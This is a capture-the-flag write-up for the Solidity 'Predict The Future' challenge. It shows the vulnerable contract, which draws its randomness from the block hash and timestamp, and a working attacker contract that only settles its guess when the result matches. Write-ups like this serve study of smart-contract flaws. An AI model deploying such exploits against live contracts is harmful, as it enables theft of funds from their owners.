# Predict The Future

**HINT:** Create a contract to only submit will your guess when it is the right number. 
<details>
<summary>Answer</summary>
<p>

This contract will lock in your guess but will only settle when the ```answer = your guess ```(Tx will fail other wise)
```
pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
contract predictor {
    uint8 Lockedguess = 2;
    address PredictTheFutureContract = 0xE86C7a4C8B09A88c63860d948B5376D9990a8509;
    PredictTheFutureChallenge sendguess = PredictTheFutureChallenge(PredictTheFutureContract);
    
    function() payable public {
    }
    
    function destroy() public {
        selfdestruct(msg.sender);
    }
    
    function guessLock() public payable {
        sendguess.lockInGuess.value(msg.value)(Lockedguess);
    }
    
    function predict() public {
        require(Lockedguess == (uint8(keccak256(block.blockhash(block.number - 1), now)) % 10));
        sendguess.settle();
    }
}
```

</p>
</details>